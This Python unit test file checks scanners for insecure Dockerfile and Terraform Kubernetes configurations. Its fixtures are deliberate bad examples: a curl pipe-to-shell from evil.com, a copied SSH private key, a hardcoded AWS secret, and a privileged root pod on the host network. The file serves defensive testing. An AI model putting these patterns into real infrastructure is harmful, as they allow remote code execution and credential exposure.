#!/usr/bin/env python3
"""
tests/test_iac.py
=================
Unit tests for Dockerfile and Terraform Kubernetes IaC scanners.
"""

import unittest
from iac import DockerfileScanner, TerraformKubernetesScanner


class TestIaCScanner(unittest.TestCase):
    def test_dockerfile_scanner_insecure(self):
        dockerfile_content = """
FROM ubuntu:latest
ENV AWS_SECRET_KEY="SuperSecret12345"
RUN curl http://evil.com/setup.sh | sh
COPY ./id_rsa /root/.ssh/id_rsa
USER root
"""
        scanner = DockerfileScanner()
        report = scanner.scan_content(dockerfile_content, source_name="Dockerfile.test")

        rule_ids = {f.rule_id for f in report.findings}
        self.assertIn("D01", rule_ids)  # Mutable latest tag
        self.assertIn("D02", rule_ids)  # USER root
        self.assertIn("D03", rule_ids)  # Insecure curl | sh
        self.assertIn("D05", rule_ids)  # id_rsa copied
        self.assertIn("D06", rule_ids)  # Hardcoded secret in ENV
        self.assertLess(report.compliance_score, 50.0)

    def test_terraform_scanner_insecure(self):
        tf_content = """
resource "kubernetes_pod" "insecure_pod" {
  metadata {
    name = "test-pod"
  }
  spec {
    host_network = true
    container {
      name  = "app"
      image = "nginx:1.14"
      security_context {
        privileged = true
        run_as_user = 0
      }
    }
  }
}
"""
        scanner = TerraformKubernetesScanner()
        report = scanner.scan_content(tf_content, source_name="pod.tf")

        rule_ids = {f.rule_id for f in report.findings}
        self.assertIn("TF-K8S-01", rule_ids)  # Privileged
        self.assertIn("TF-K8S-02", rule_ids)  # Host network
        self.assertIn("TF-K8S-03", rule_ids)  # run_as_user = 0


if __name__ == "__main__":
    unittest.main()
